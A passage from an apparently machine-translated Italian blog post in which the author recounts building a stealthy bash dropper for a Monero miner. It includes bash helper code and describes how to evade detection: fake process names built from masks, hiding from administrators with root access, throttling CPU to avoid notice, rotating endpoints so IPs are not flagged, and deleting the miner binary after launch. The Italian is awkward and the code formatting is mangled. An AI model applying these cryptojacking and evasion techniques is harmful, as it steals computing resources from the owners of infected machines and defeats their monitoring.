        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Vale la pena menzionare l'uso di un [CDN] per la manutenzione del carico utile. Anche in questo caso cloudflare ci salva dalle spese di larghezza di banda. Rinominando semplicemente il nostro payload compresso con a<em> estensione del file</em> supportato da cloudflare... diventa memorizzato nella cache. Cloudflare non controlla le intestazioni di ciò che sta servendo, forse perché farlo su quella scala è semplicemente impraticabile.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Avventure lungo Bashland</a></h2><p>Bash è stato scelto con il presupposto che sia portatile, non sembra troppo fuori posto ed è più onnipresente rispetto ad altri linguaggi di scripting come perl, ruby ​​o python. La verità è che un binario autonomo scritto in golang o lua sarebbe stato molto più semplice, con meno bug e più facile da mantenere, fondamentalmente bash era la scelta peggiore possibile, in mia difesa, quando mi sono grattato così tanti pruriti con bash , era troppo tardi per una riscrittura, e stava anche diventando un po' noioso.<p>C'era anche l'opzione di utilizzare busybox con il flag del tempo di compilazione per utilizzare tutti i builtin (come grep e sed), tuttavia l'utilizzo di builtin in questo modo non consente di generare lavori (fork) ed espone il demone a potenziali deadlock.<p>Descriverò alcune funzioni di bash qui, con l'elenco completo disponibile<a href=\assets/posts/bash_functions.txt> qui</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Utilizzare il<code>RANDOM</code> variabile per ottenere un numero compreso tra 97-122 corrispondente a un codice carattere, printf dovrebbe essere un built-in, non vogliamo eseguire il fork all'interno di un ciclo.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Sfrutta le pipe per creare descrittori di file anonimi, questi non si comportano esattamente come descrittori di file ma sono abbastanza buoni per<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Dormendo senza fork, abusando della funzionalità di timeout dell'integrato read, utilizza un descrittore di file dedicato e dobbiamo assicurarci che sia disponibile per evitare la terminazione.<p>Ci sono funzioni come<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> sono usati per monitorare l'utilizzo del sistema, tutti usano linux<code>/proc</code> file senza strumenti come<code>ps</code> , quindi niente fork, tutto puro bash.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>I coprocessi sono disponibili da bash<code>v4</code> , sono come i lavori tranne per il fatto che hanno un nome e i propri descrittori di file.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>Stiamo scrivendo un demone, che è un processo di lunga durata, e stiamo usando molti descrittori di file, vogliamo davvero fare delle pulizie per evitare di incorrere in<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Questa funzione si basa su<a href=https://ipinfo.io/> ipinfo</a> determinare la regione del lavoratore, che consente di regolare alcune logiche dipendenti dalla regione,<a href=\assets/posts/geoip.json> geoip.json</a> raggruppa i paesi in regioni, poiché vogliamo la regione di primo livello e non siamo interessati al paese specifico.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bash ha il supporto per le connessioni tcp, avendo un'astrazione finita<code>/dev/tcp</code> (anche per udp, ma la maggior parte sembra essere solitamente disabilitato in fase di compilazione, quindi non puoi fare affidamento su di esso). Questi file sono una cosa bash, non fanno parte di Linux<code>/dev</code> albero.<p>Vale la pena menzionare anche un sistema di blocco per gestire la concorrenza tra i lavori bash. Per consentire a più lavori di funzionare con i blocchi, tutti devono condividere un descrittore di file, quindi il nostro<code>locker</code> che è anche un lavoro, deve essere avviato prima di altri lavori che desiderano utilizzare il blocco. L'armadietto continua semplicemente a leggere<code>stdin</code> in attesa di richieste di blocco, risposta su<code>stdout</code> a seconda dello stato booleano corrente memorizzato in una variabile. Non garantisco che questo approccio sia privo di gare, ma sembra funzionare in modo decente, d'altra parte, ho trovato che i descrittori di file non sono molto affidabili, poiché sospetto che ci siano alcuni buffer che non vengono scaricati da qualche parte nel<em> tubi</em> e alla fine raggiungere un punto morto (il che significa che non puoi fare affidamento sul fatto che l'armadietto ti dia una risposta tutte le volte).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Ripulisci la tua spazzatura ... i programmi bash complessi finiscono per utilizzare molte variabili e se abusi dello spazio globale diventa gonfio. Se stai generando lavori di shell, ereditano tutto l'ambiente (che è effettivamente duplicato, non condiviso), puoi finire rapidamente con il consumo di bash<code>100M</code> di memoria, non bello. Inoltre vogliamo davvero essere di basso profilo. Nel nostro scenario di distribuzione, l'avversario<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> può potenzialmente avere accesso root e informazioni complete sui nostri processi<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , e sai... ogni processo contiene informazioni sul comando completo che lo ha avviato e sulle variabili di ambiente esportate.<h2 id=configuration><a class=header-anchor href=#configuration> Configurazione</a></h2><p>Una volta che abbiamo il nostro ambiente e i nostri strumenti, dobbiamo mettere a punto il nostro miner per la macchina su cui è in esecuzione, i passaggi di configurazione in pseudo codice:<ul><li><p>nome del processo per il minatore<li><p>informazioni sull'host (ram/core/cache/<code>ENV_VARS</code>)<li><p>versione di configurazione<li><p><code>worker_id</code> per il miner (da ip e host)<li><p>ip/porta per la connessione</ul><p>La scelta di un nome per il processo è necessaria per<em> nascondere</em> il fatto che stiamo eseguendo un minatore, ma non stiamo solo rinominando il nostro binario, abbiamo un elenco di<strong> maschere</strong> per potenziali candidati (un file di testo normale in cui ogni riga è una maschera):<ul><li><p>scegli una maschera a caso<li><p>mescola gli elementi della coda della stringa (tutti tranne il primo) per ottenere un comando di processo diverso. Ora abbiamo una stringa che assomiglia a<code>cmd --arg2 --arg1 --arg3</code> . Questa è la nostra maschera da minatore, eseguiamo il binario<em> privo di</em> argomenti, ma sembra che abbiamo avviato un comando<code>cmd</code> con argomenti<code>--arg1 --arg2 --arg3</code>. Spazi e trattini sono consentiti nei nomi di file, quindi va bene eseguire un binario chiamato in questo modo, non sembra che Linux distingua tra l'eseguibile e gli argomenti durante la memorizzazione dei comandi di processo.<p>La configurazione del miner viene caricata automaticamente da<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Hashrate</a></h3><p>, con il tempo, il minatore a monte ne ha ottenuti molti<strong> sintonizzazione automatica</strong> caratteristiche, quindi ha reso parte dei miei script ridondanti, ma la differenza tra upstream e downstream qui è che l'obiettivo a monte è massimizzare<em> prestazione</em> , mentre il nostro obiettivo è massimizzare<em> efficienza e offuscamento</em> , non vogliamo sorpassare il sistema, vogliamo sanguinare un po' senza interruzioni del servizio.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Per questo, abbiamo bisogno di una comprensione più granulare dell'ambiente, il<code>l2/l3</code> struttura della cache del processore, ram e core e processore corrente<em> media</em> carico e cpu<em> utilizzo</em> . Ho tentato di costruire un<a href=https://en.wikipedia.org/wiki/Finite-state_machine> macchina di stato</a> in bash che partirebbe dal minimo indispensabile e proverebbe diverse configurazioni stabilizzandosi lentamente sulla media migliore. Era un<strong> enorme</strong> spreco di fatica disseminato di<a href=https://en.wikipedia.org/wiki/Technical_debt> debito tecnico</a> che è andato in bancarotta molto rapidamente ed è stato per lo più scartato, con solo i resti persistenti nel codebase.<p>Frack tutto questo jumbo di sintonizzazione automatica, abbiamo appena fatto dormire il minatore a seconda dell'utilizzo / carico dell'host, questo ha richiesto modifiche al minatore per<code>sleep</code> tra i thread e alcune correzioni al watchdog di configurazione<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , che ci consentirebbe di ricaricare la quantità di sospensione in fase di esecuzione. La logica è molto più semplificata e si presenta così:<ul><li><p>se l'utilizzo è sopra/sotto $TARGET_USAGE (± margine di errore) aumenta/diminuisci il sonno<li><p>se carico medio entro<code>1m</code> è sopra/sotto $TARGET_LOAD metti in pausa/riprendi l'estrazione</ul><h3 id=connection><a class=header-anchor href=#connection> Connessione</a></h3><p>Nella nostra raccolta di bash abbiamo mostrato le utilità per la connessione. Perché abbiamo bisogno di questi? Perché abbiamo bisogno di diversità; semplicemente codificare un endpoint nella configurazione non durerà a lungo, quando qualcosa sembra sospetto e ha attività di rete, gli IP vengono contrassegnati.<p>All'inizio abbiamo sperimentato un paio di metodi:<ul><li><p>usando<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> proxychains</a> per sovraccaricare le chiamate di rete del miner, ma richiedeva che il miner fosse costruito con librerie dinamiche e dovevi spedirle con il payload, quindi non era pratico.<li><p>correndo un<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> tunnel in avanti</a> fianco a fianco con il miner: questo comportava un notevole sovraccarico di configurazione, poiché ora stavamo configurando due processi su ciascuna distribuzione, il che equivaleva a più bug.</ul><p>Alla fine abbiamo risolto con la semplice spedizione di un elenco di endpoint, archiviati in una variabile bash, scegliendone uno a caso. Le connessioni erano ovviamente crittografate. Quali sono questi endpoint? Spedizionieri al proxy che gestirebbe i lavori dei minatori.</p><img src=/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png><p>Perché abbiamo bisogno di un<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> proxy minerario</a> ? Non ho mai superato ~100 connessioni simultanee, quindi un proxy non era realmente necessario per il caricamento della rete, ma era conveniente per negoziare l'algoritmo di hashing e fornire obiettivi di difficoltà diversi a diversi minatori, per impedire ai minatori di lavorare su<strong> difficoltà</strong> obiettivi che richiederebbero troppo tempo per essere completati ed eviterebbe il rischio di sprecare il calcolo su lavori incompiuti.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> Anche il software del pool ha richiesto alcune modifiche poiché era felicemente pubblicizzato per essere un proxy su semplici richieste http...<em> che doveva essere scaduto</em> e un fork ha aggiunto il controllo degli accessi, quindi abbiamo basato le nostre mod su quello.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> Modifica json</a></h3><p>Applicando le modifiche a un file json con solo bash, siamo riusciti a cavarcela con alcune sostituzioni di env var e alcune espressioni regolari. Inizialmente facevamo affidamento su un<code>envsubst</code> binario per applicare le variabili, quindi siamo andati a tutto bash<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> con questa logica:<ul><li><p>leggi il modello di configurazione<li><p>sostituisci tutte le virgolette con una stringa molto esoterica (come<code>_#_#</code>)<li><p><code>eval</code> Il template<li><p>sostituisci tutte le occorrenze esoteriche con le virgolette</ul><p>Oltre a evitare processi secondari, un altro vantaggio è che otteniamo funzionalità bash complete nei nostri modelli. Per leggere e scrivere senza modelli, dobbiamo fare affidamento sulle funzionalità di bash regex:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Questo ci consente solo di modificare singole righe, per le voci su più righe considera solo la prima riga..ma è abbastanza buono per il nostro caso d'uso.<h2 id=runtime><a class=header-anchor href=#runtime> Tempo di esecuzione</a></h2><p>Che aspetto ha il nostro runtime? Abbiamo un processo bash principale che esegue il ciclo principale, quindi il sottoprocesso miner, il sottoprocesso monitor cpu, l'armadietto e il sintonizzatore. È quasi una manciata.<p>Per prima cosa vogliamo assicurarci che se qualcosa va storto, non lasciamo un pasticcio, questo significa che usiamo una trappola bash per eseguire le pulizie al termine<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> disattiva la trappola per prevenire la ricorsione. La trappola uccide tutti i posti di lavoro e rimuove l'ambiente di lavoro.<p>È ora di avviare il miner, che è memorizzato come variabile bash nella codifica base64. Lo scarichiamo sul filesystem, quindi scarichiamo la configurazione, eseguiamo il miner e rimuoviamo sia il miner che la configurazione. Su Linux puoi rimuovere l'eseguibile di un processo in esecuzione, (su Windows questo non è consentito).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup>Quando il minatore è in esecuzione, sul filesystem c'è solo un<code>.. /</code> directory con a<code>b64</code> collegamento in esso.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
